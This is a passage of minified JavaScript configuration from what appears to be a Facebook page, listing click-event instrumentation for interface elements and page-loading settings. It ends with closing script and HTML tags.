 ["click"],ReactComposerMediaSprout:["click"],UFIReactionsBlingSocialSentenceComments:["click"],UFIReactionsBlingSocialSentenceSeens:["click"],UFIReactionsBlin
 gSocialSentenceShares:["click"],UFIReactionsBlingSocialSentenceViews:["click"],UFIReactionsBlingSocialSentence:["click"],UFIReactionsSocialSentence:["click"],
 VideoFullscreenButton:["click"],Tahoe:["click"],TahoeFromVideoPlayer:["click"],TahoeFromVideoLink:["click"],TahoeFromPhoto:["click"],"":["click"],FBStoryTrayI
 tem:["click"],Mobile_Feed_Jewel_Button:["click"],Mobile_Requests_Jewel_Button:["click"],Mobile_Messages_Jewel_Button:["click"],Mobile_Notifications_Jewel_Butt
 on:["click"],Mobile_Search_Jewel_Button:["click"],Mobile_Bookmarks_Jewel_Button:["click"],Mobile_Feed_UFI_Comment_Button_Permalink:["click"],Mobile_Feed_UFI_C
 omment_Button_Flyout:["click"],Mobile_Feed_UFI_Token_Bar_Flyout:["click"],Mobile_Feed_UFI_Token_Bar_Permalink:["click"],Mobile_UFI_Share_Button:["click"],Mobi
 le_Feed_Photo_Permalink:["click"],Mobile_Feed_Video_Permalink:["click"],Mobile_Feed_Profile_Permalink:["click"],Mobile_Feed_Story_Permalink:["click"],Mobile_F
 eed_Page_Permalink:["click"],Mobile_Feed_Group_Permalink:["click"],Mobile_Feed_Event_Permalink:["click"],ProfileIntroCardAddFeaturedMedia:["click"],ProfileSec
 tionAbout:["click"],ProfileSectionAllRelationships:["click"],ProfileSectionAtWork:["click"],ProfileSectionContactBasic:["click"],ProfileSectionEducation:["cli
 ck"],ProfileSectionOverview:["click"],ProfileSectionPlaces:["click"],ProfileSectionYearOverviews:["click"],IntlPolyglotHomepage:["click"],ProtonElementSelecti
 on:["click"]},manual_instrumentation:false,profile_eager_execution:true,disable_heuristic:true,disable_event_profiler:false},1726],["KillabyteProfilerConfig",
 [],{htmlProfilerModule:null,profilerModule:null,depTypes:{BL:"bl",NON_BL:"non-bl"}},1145],["QuicklingConfig",[],{version:"1000923231;0;",sessionLength:10,inac
 tivePageRegex:"^/(fr/u\\.php|ads/|advertising|ac\\.php|ae\\.php|a\\.php|ajax/emu/(end|f|h)\\.php|badges/|comments\\.php|connect/uiserver\\.php|editalbum\\.php
 .+add=1|ext/|feeds/|help([/?]|$)|identity_switch\\.php|isconnectivityahumanright/|intern/|login\\.php|logout\\.php|sitetour/homepage_tour\\.php|sorry\\.php|syn
 dication\\.php|webmessenger|/plugins/subscribe|lookback|brandpermissions|gameday|pxlcld|comet|worldcup/map|livemap|work/admin|work/standardadmin|work/reseller|
 ([^/]+/)?dialog)|legal|\\.pdf$",badRequestKeys:["nonce","access_token","oauth_token","xs","checkpoint_data","code"],logRefreshOverhead:false},60]]},last_in_pha
 se:true,the_end:true});}),"onPageletArrive last_response",{"root":true,"pagelet":"last_response"})();</script></body></html>